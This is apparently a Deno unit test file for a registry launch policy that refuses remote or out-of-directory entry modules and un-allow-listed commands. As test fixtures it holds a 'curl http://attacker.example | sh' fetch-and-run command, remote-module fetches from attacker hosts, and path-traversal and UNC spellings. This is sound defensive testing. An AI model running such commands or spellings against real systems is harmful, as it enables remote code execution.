// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * Unit: {@link launchDenial} — the policy deciding whether a registry
 * descriptor's launch location may be spawned. The registry server runs what
 * the registry tells it to, so a descriptor pointing at a remote entry module is
 * a remote code-execution primitive unless the operator named its origin, and
 * one pointing at a local file outside the allowed directories is the same
 * primitive for anyone who can write a file on the host.
 */

import { assertEquals } from "./_assert.ts";
import {
  hostLaunchFileSystem,
  LAUNCH_COMMANDS_ENV,
  LAUNCH_DIRS_ENV,
  LAUNCH_HOSTS_ENV,
  launchDenial,
  type LaunchFileSystem,
} from "../src/registry/launch_policy.ts";
import { ALLOW_INSECURE_ENV } from "../src/http.ts";
import type { BuildLocation } from "../src/registry/descriptor.ts";

/**
 * A fake filesystem confined by default to `/work`. `links` maps a symlink's
 * path to its target; `realPath` follows them by prefix, as the OS would.
 */
function fakeFs(
  links: Record<string, string> = {},
  defaultDir = "/work",
): LaunchFileSystem {
  return {
    defaultDir,
    realPath: (path) => {
      if (path.includes("unresolvable")) return undefined;
      for (const [link, target] of Object.entries(links)) {
        if (path === link || path.startsWith(`${link}/`)) {
          return target + path.slice(link.length);
        }
      }
      return path;
    },
  };
}

/** {@link launchDenial} over `fs` (default {@link fakeFs}). */
function deny(
  location: BuildLocation,
  readEnv: (name: string) => string | undefined,
  fs: LaunchFileSystem = fakeFs(),
) {
  return launchDenial(location, readEnv, fs);
}

/** Build a `readEnv` over a plain record. */
function env(
  vars: Record<string, string> = {},
): (name: string) => string | undefined {
  return (name) => vars[name];
}

/** A module-kind location for `module`. */
function moduleAt(module: string): BuildLocation {
  return { kind: "module", module, cwd: "/work" };
}

/** A command-kind location for `command`. */
function commandOf(...command: string[]): BuildLocation {
  return { kind: "command", command, cwd: "/work" };
}

Deno.test("a local entry module inside the allowed directory is allowed", () => {
  for (
    const module of [
      "file:///work/zuke.ts", // what `zuke register` writes (Deno.mainModule)
      "file://localhost/work/zuke.ts",
      "/work/zuke.ts",
      "/work/sub/../zuke.ts",
      "./zuke.ts",
      "zuke.ts",
      "file:///work/a%20b/zuke.ts",
    ]
  ) {
    assertEquals(deny(moduleAt(module), env()), null, module);
  }
  // The allowed directory itself may be the working directory, or hold it.
  assertEquals(
    deny({ kind: "module", module: "/work/zuke.ts", cwd: "/work/sub" }, env()),
    null,
  );
});

Deno.test("a Windows drive path is confined case-insensitively", () => {
  const fs = fakeFs({}, "C:\\Work");
  for (
    const module of [
      "C:\\work\\zuke.ts",
      "c:/WORK/zuke.ts",
      "file:///C:/Work/zuke.ts",
      "zuke.ts",
    ]
  ) {
    assertEquals(
      deny({ kind: "module", module, cwd: "C:\\Work" }, env(), fs),
      null,
      module,
    );
  }
  assertEquals(
    deny(
      { kind: "module", module: "D:\\work\\zuke.ts", cwd: "C:\\Work" },
      env(),
      fs,
    )
      ?.reason,
    "launch_dir_not_allowed",
  );
});

Deno.test("a local entry module outside the allowed directories is refused", () => {
  // The finding's scenario: a registry writer drops /tmp/evil.ts and names it.
  for (
    const module of [
      "/tmp/evil.ts",
      "file:///tmp/evil.ts",
      "../tmp/evil.ts",
      "/work/../tmp/evil.ts",
      "file:///work/..%2F..%2Ftmp/evil.ts",
      // Not valid UTF-8, so it cannot be decoded whole; Deno still opens it.
      "file:///work/..%2F..%2Ftmp%2Fevil%E0.ts",
    ]
  ) {
    const denial = deny(moduleAt(module), env());
    assertEquals(denial?.reason, "launch_dir_not_allowed", module);
    assertEquals(denial?.detail.includes(LAUNCH_DIRS_ENV), true);
    assertEquals(denial?.detail.includes("entry module"), true);
  }
});

Deno.test("a sibling sharing the allowed directory's prefix is outside it", () => {
  assertEquals(
    deny(
      { kind: "module", module: "/work-evil/x.ts", cwd: "/work-evil" },
      env(),
    )?.reason,
    "launch_dir_not_allowed",
  );
  assertEquals(
    deny(moduleAt("/work-evil/x.ts"), env())?.reason,
    "launch_dir_not_allowed",
  );
});

Deno.test("a working directory outside the allowed directories is refused", () => {
  const outside: BuildLocation = {
    kind: "module",
    module: "/work/zuke.ts",
    cwd: "/tmp",
  };
  const denial = deny(outside, env());
  assertEquals(denial?.reason, "launch_dir_not_allowed");
  assertEquals(denial?.detail.includes("working directory"), true);
  // A relative working directory has no fixed place to confine.
  assertEquals(
    deny({ kind: "module", module: "/work/zuke.ts", cwd: "work" }, env())
      ?.reason,
    "launch_dir_not_allowed",
  );
  // The working directory is the writer's to choose for a remote module too.
  assertEquals(
    deny(
      {
        kind: "module",
        module: "https://builds.example.com/z.ts",
        cwd: "/tmp",
      },
      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
    )?.reason,
    "launch_dir_not_allowed",
  );
});

Deno.test("a symlink out of the allowed directory does not carry its target inside", () => {
  const fs = fakeFs({ "/work/link": "/tmp/planted" });
  assertEquals(
    deny(moduleAt("/work/link/evil.ts"), env(), fs)?.reason,
    "launch_dir_not_allowed",
  );
  assertEquals(
    deny(
      { kind: "module", module: "/work/zuke.ts", cwd: "/work/link" },
      env(),
      fs,
    )
      ?.reason,
    "launch_dir_not_allowed",
  );
  // A path that cannot be resolved at all is refused, not guessed at.
  assertEquals(
    deny(moduleAt("/work/unresolvable/zuke.ts"), env())?.reason,
    "launch_dir_not_allowed",
  );
});

Deno.test("an allowed directory reached through a symlink is compared canonically", () => {
  // The operator names /link; it resolves to /real, as do the paths under it.
  const fs = fakeFs({ "/link": "/real" }, "/link");
  assertEquals(
    deny({ kind: "module", module: "/link/zuke.ts", cwd: "/link" }, env(), fs),
    null,
  );
});

Deno.test("the operator names the allowed directories, or turns confinement off", () => {
  const elsewhere: BuildLocation = {
    kind: "module",
    module: "/srv/b/zuke.ts",
    cwd: "/srv/b",
  };
  assertEquals(deny(elsewhere, env())?.reason, "launch_dir_not_allowed");
  // The list replaces the default, separated by commas or newlines, so a path
  // with a space can be named; a relative entry matches nothing.
  assertEquals(
    deny(elsewhere, env({ [LAUNCH_DIRS_ENV]: "/opt/x ,\n/srv/b" })),
    null,
  );
  assertEquals(
    deny(moduleAt("/work/zuke.ts"), env({ [LAUNCH_DIRS_ENV]: "/srv/b" }))
      ?.reason,
    "launch_dir_not_allowed",
  );
  assertEquals(
    deny(elsewhere, env({ [LAUNCH_DIRS_ENV]: "srv/b" }))?.reason,
    "launch_dir_not_allowed",
  );
  // Directories are not case-folded on a POSIX path.
  assertEquals(
    deny(elsewhere, env({ [LAUNCH_DIRS_ENV]: "/SRV/b" }))?.reason,
    "launch_dir_not_allowed",
  );
  assertEquals(
    deny(moduleAt("/tmp/evil.ts"), env({ [LAUNCH_DIRS_ENV]: "*" })),
    null,
  );
  // Naming the filesystem root is the same decision, spelled as a directory.
  assertEquals(
    deny(moduleAt("/tmp/evil.ts"), env({ [LAUNCH_DIRS_ENV]: "/" })),
    null,
  );
  // Turning confinement off does not admit an origin nobody named.
  assertEquals(
    deny(
      moduleAt("https://attacker.example/x.ts"),
      env({ [LAUNCH_DIRS_ENV]: "*" }),
    )?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("a module on another host spelled as a path is remote", () => {
  // Windows opens every one of these over SMB, so each is a fetch the origin
  // allow-list has to approve, named by its host.
  const cases: [string, string][] = [
    ["file://attacker.example/share/x.ts", "attacker.example"],
    ["//attacker.example/x.ts", "attacker.example"],
    ["\\\\attacker\\share\\x.ts", "attacker"],
    ["/\\attacker/share/x.ts", "attacker"],
    ["file:///%2F%2Fattacker/share/x.ts", "attacker"],
  ];
  for (const [module, host] of cases) {
    const denial = deny(moduleAt(module), env());
    assertEquals(denial?.reason, "launch_origin_not_allowed", module);
    assertEquals(denial?.detail.includes(`"${host}"`), true, module);
    assertEquals(
      deny(moduleAt(module), env({ [LAUNCH_HOSTS_ENV]: host })),
      null,
      module,
    );
  }
  // Any run of leading separators reads as a host, and is refused as one.
  assertEquals(
    deny(moduleAt("///work/zuke.ts"), env())?.reason,
    "launch_origin_not_allowed",
  );
  // The same spelling as a command argument faces the same rule.
  assertEquals(
    deny(
      commandOf("deno", "run", "\\\\attacker\\share\\x.ts"),
      env({ [LAUNCH_COMMANDS_ENV]: "deno" }),
    )?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("the host filesystem resolves symlinks and missing tails", async () => {
  if (Deno.build.os === "windows") return; // symlink creation is privileged there
  const dir = await Deno.realPath(await Deno.makeTempDir());
  try {
    // The default directory is the project root above the working directory,
    // or the working directory itself when there is none.
    const fs = hostLaunchFileSystem();
    assertEquals(fs.defaultDir, Deno.cwd());
    const previous = Deno.cwd();
    Deno.chdir(dir);
    try {
      assertEquals(hostLaunchFileSystem().defaultDir, dir);
    } finally {
      Deno.chdir(previous);
    }
    await Deno.mkdir(`${dir}/inside`);
    await Deno.mkdir(`${dir}/outside`);
    await Deno.writeTextFile(`${dir}/inside/file`, "");
    await Deno.symlink(`${dir}/outside`, `${dir}/inside/link`);
    const real = (path: string) => fs.realPath(path)?.replace(/\\/g, "/");
    const slashed = dir.replace(/\\/g, "/");
    assertEquals(real(`${dir}/inside/link`), `${slashed}/outside`);
    // A missing tail keeps its name under the resolved ancestor.
    assertEquals(
      real(`${dir}/inside/link/missing/x.ts`),
      `${slashed}/outside/missing/x.ts`,
    );
    // A dangling link could be pointed anywhere later, so it does not resolve,
    // nor does anything beneath it.
    await Deno.symlink(`${dir}/outside/later`, `${dir}/inside/dangling`);
    assertEquals(fs.realPath(`${dir}/inside/dangling`), undefined);
    assertEquals(fs.realPath(`${dir}/inside/dangling/x.ts`), undefined);
    // A missing path straight under the filesystem root keeps its name.
    assertEquals(
      fs.realPath("/zuke-launch-policy-missing"),
      "/zuke-launch-policy-missing",
    );
    // A file used as a directory cannot be resolved.
    assertEquals(fs.realPath(`${dir}/inside/file/x.ts`), undefined);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("a remote entry module is refused unless its origin is allow-listed", () => {
  const denial = deny(
    moduleAt("https://attacker.example/x.ts"),
    env(),
  );
  assertEquals(denial?.reason, "launch_origin_not_allowed");
  assertEquals(denial?.detail.includes("attacker.example"), true);
  assertEquals(denial?.detail.includes(LAUNCH_HOSTS_ENV), true);

  assertEquals(
    deny(
      moduleAt("https://builds.example.com/zuke.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
    ),
    null,
  );
  // A list, with either separator, and matched case-insensitively.
  assertEquals(
    deny(
      moduleAt("https://Builds.Example.com/zuke.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "a.example, builds.example.com  b.example" }),
    ),
    null,
  );
  // Allow-listing one host does not admit another.
  assertEquals(
    deny(
      moduleAt("https://attacker.example/x.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
    )?.reason,
    "launch_origin_not_allowed",
  );
  // A suffix of an allow-listed host is a different host.
  assertEquals(
    deny(
      moduleAt("https://evil-builds.example.com/x.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
    )?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("a wildcard allow-list admits any origin", () => {
  assertEquals(
    deny(
      moduleAt("https://anywhere.example/x.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "*" }),
    ),
    null,
  );
});

Deno.test("a remote specifier with no hostname is named by its scheme", () => {
  // `deno run jsr:@scope/build` fetches and executes code just as an https URL
  // does, but has no hostname — so the scheme is what an operator allow-lists.
  assertEquals(
    deny(moduleAt("jsr:@scope/build"), env())?.reason,
    "launch_origin_not_allowed",
  );
  assertEquals(
    deny(
      moduleAt("jsr:@scope/build"),
      env({ [LAUNCH_HOSTS_ENV]: "jsr:" }),
    ),
    null,
  );
  assertEquals(
    deny(moduleAt("npm:some-build"), env())?.reason,
    "launch_origin_not_allowed",
  );
  assertEquals(
    deny(moduleAt("data:text/plain,console.log(1)"), env())?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("an allow-listed plaintext origin still needs the insecure opt-out", () => {
  const allowed = env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" });
  const denial = deny(
    moduleAt("http://builds.example.com/zuke.ts"),
    allowed,
  );
  assertEquals(denial?.reason, "insecure_launch_url");
  assertEquals(denial?.detail.includes(ALLOW_INSECURE_ENV), true);

  assertEquals(
    deny(
      moduleAt("http://builds.example.com/zuke.ts"),
      env({
        [LAUNCH_HOSTS_ENV]: "builds.example.com",
        [ALLOW_INSECURE_ENV]: "1",
      }),
    ),
    null,
  );
  // Loopback needs no opt-out — there is no path to sit on — but it is still
  // remote code, so it is still allow-listed.
  assertEquals(
    deny(
      moduleAt("http://localhost:8000/zuke.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "localhost" }),
    ),
    null,
  );
  assertEquals(
    deny(moduleAt("http://localhost:8000/zuke.ts"), env())?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("a command location is refused unless its program is allow-listed", () => {
  // The registry writer chooses the program *and* its arguments, so a command
  // descriptor is code execution on a registry's say-so — the same threat the
  // module gate refuses, spelled without a fetch.
  const denial = deny(commandOf("./zuke", "--"), env());
  assertEquals(denial?.reason, "launch_command_not_allowed");
  assertEquals(denial?.detail.includes(LAUNCH_COMMANDS_ENV), true);
  assertEquals(denial?.detail.includes("./zuke"), true);

  assertEquals(
    deny(
      commandOf("./zuke", "--"),
      env({ [LAUNCH_COMMANDS_ENV]: "./zuke" }),
    ),
    null,
  );
});

Deno.test("an allow-listed command's working directory is confined like a module's", () => {
  // `make` run from a writer-chosen directory reads that directory's Makefile,
  // so naming the program does not let the registry choose where it runs.
  const allowed = env({ [LAUNCH_COMMANDS_ENV]: "make" });
  const at = (cwd: string): BuildLocation => ({
    kind: "command",
    command: ["make"],
    cwd,
  });
  for (const cwd of ["/tmp/evil", "/work/link", "relative/dir"]) {
    assertEquals(
      deny(at(cwd), allowed, fakeFs({ "/work/link": "/tmp/evil" }))?.reason,
      "launch_dir_not_allowed",
      cwd,
    );
  }
  assertEquals(deny(at("/work/sub"), allowed), null);
  assertEquals(
    deny(
      at("/tmp/evil"),
      env({ [LAUNCH_COMMANDS_ENV]: "make", [LAUNCH_DIRS_ENV]: "/tmp" }),
    ),
    null,
  );
});

Deno.test("the command allow-list matches the program exactly", () => {
  // An entry admits the exact string the descriptor wrote, and nothing else.
  assertEquals(
    deny(
      commandOf("make", "release"),
      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
    ),
    null,
  );
  assertEquals(
    deny(
      commandOf("/usr/bin/make", "release"),
      env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
    ),
    null,
  );
  // Case folds, because Windows program names do.
  assertEquals(
    deny(
      commandOf("MAKE"),
      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
    ),
    null,
  );
});

Deno.test("a bare allow-list entry does not admit a same-named file elsewhere", () => {
  // The descriptor chooses the program string *and* the working directory a
  // relative one resolves against. Matching by basename would therefore let a
  // registry writer point the operator's trusted `make` at a file of their own
  // — so `make` admits the bare name the OS resolves on PATH, and nothing else.
  const allowed = env({ [LAUNCH_COMMANDS_ENV]: "make" });
  for (
    const program of [
      "/tmp/attacker/make",
      "./make",
      "../make",
      ".//make",
      "C:\\attacker\\make",
      "attacker/make",
    ]
  ) {
    assertEquals(
      deny(commandOf(program, "release"), allowed)?.reason,
      "launch_command_not_allowed",
      `${program} must not be admitted by the bare entry "make"`,
    );
  }
  // The converse: an absolute entry does not admit the bare name either.
  assertEquals(
    deny(
      commandOf("make"),
      env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
    )
      ?.reason,
    "launch_command_not_allowed",
  );
});

Deno.test("a program that trims to nothing is never admitted", () => {
  // `allowList` drops empty entries, so no list can hold "" — but a program of
  // whitespace must be refused on its own account, not by that coincidence.
  for (const program of [" ", "\t", "\u00a0", "\u200b"]) {
    assertEquals(
      deny(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "make" }))
        ?.reason,
      "launch_command_not_allowed",
    );
    assertEquals(
      deny(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "" }))
        ?.reason,
      "launch_command_not_allowed",
    );
  }
});

Deno.test("the command allow-list is comma-separated, so a path may contain spaces", () => {
  // Trimmed, newline-tolerant, and separated on commas rather than whitespace —
  // a hostname never contains a space but a program path routinely does.
  for (
    const raw of [
      "make, deploy.sh",
      "make\ndeploy.sh",
      " make ,,deploy.sh ",
    ]
  ) {
    assertEquals(
      deny(commandOf("deploy.sh"), env({ [LAUNCH_COMMANDS_ENV]: raw })),
      null,
    );
  }
  assertEquals(
    deny(
      commandOf("C:\\Program Files\\make.EXE"),
      env({ [LAUNCH_COMMANDS_ENV]: "make, c:\\program files\\make.exe" }),
    ),
    null,
  );
  assertEquals(
    deny(
      commandOf("/bin/sh", "-c", "curl http://attacker.example | sh"),
      env({ [LAUNCH_COMMANDS_ENV]: "*" }),
    ),
    null,
  );
  // An unrelated entry does not admit it.
  assertEquals(
    deny(
      commandOf("/bin/sh", "-c", "id"),
      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
    )
      ?.reason,
    "launch_command_not_allowed",
  );
});

Deno.test("an empty command is left for the caller to report", () => {
  // The server answers "no runnable launch command", which says more than a
  // policy denial would; the gate must not turn that into a refusal.
  assertEquals(deny(commandOf(), env()), null);
  assertEquals(deny(commandOf(""), env()), null);
});

Deno.test("the host allow-list does not admit a command program", () => {
  // The two lists are separate decisions: trusting an origin to serve a module
  // is not trusting a registry to name a program and its arguments.
  assertEquals(
    deny(
      commandOf("make"),
      env({ [LAUNCH_HOSTS_ENV]: "*" }),
    )?.reason,
    "launch_command_not_allowed",
  );
});

Deno.test("an allow-listed program may not fetch from an un-allow-listed origin", () => {
  // Allowing `deno` says the operator trusts the registry to run deno. It does
  // not say they trust it to run whatever deno downloads: that is the refused
  // remote-module case written as a command, so the origin rule applies to the
  // arguments too.
  const allowed = env({ [LAUNCH_COMMANDS_ENV]: "deno" });
  const denial = deny(
    commandOf("deno", "run", "-A", "https://attacker.example/x.ts"),
    allowed,
  );
  assertEquals(denial?.reason, "launch_origin_not_allowed");
  assertEquals(denial?.detail.includes("attacker.example"), true);

  // Naming the origin as well allows it, exactly as it would for a module.
  assertEquals(
    deny(
      commandOf("deno", "run", "-A", "https://builds.example.com/zuke.ts"),
      env({
        [LAUNCH_COMMANDS_ENV]: "deno",
        [LAUNCH_HOSTS_ENV]: "builds.example.com",
      }),
    ),
    null,
  );
});

Deno.test("a plaintext argument needs the insecure opt-out, like a module", () => {
  const base = {
    [LAUNCH_COMMANDS_ENV]: "deno",
    [LAUNCH_HOSTS_ENV]: "builds.example.com",
  };
  assertEquals(
    deny(
      commandOf("deno", "run", "http://builds.example.com/zuke.ts"),
      env(base),
    )?.reason,
    "insecure_launch_url",
  );
  assertEquals(
    deny(
      commandOf("deno", "run", "http://builds.example.com/zuke.ts"),
      env({ ...base, [ALLOW_INSECURE_ENV]: "1" }),
    ),
    null,
  );
});

Deno.test("ordinary local arguments are untouched by the origin rule", () => {
  // The rule is about fetching, not about arguments in general: a path, a flag
  // and a bare word are not specifiers and must not be mistaken for one.
  assertEquals(
    deny(
      commandOf(
        "make",
        "-f",
        "./Makefile",
        "deploy",
        "VERSION=1.2.3",
        "C:\\w\\x",
      ),
      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
    ),
    null,
  );
});

Deno.test("the wildcard program list still refuses a remote argument", () => {
  // `*` says the operator trusts the registry to pick programs. Fetching code
  // from an origin they never named is a separate decision, still theirs.
  assertEquals(
    deny(
      commandOf("deno", "run", "https://attacker.example/x.ts"),
      env({ [LAUNCH_COMMANDS_ENV]: "*" }),
    )?.reason,
    "launch_origin_not_allowed",
  );
});
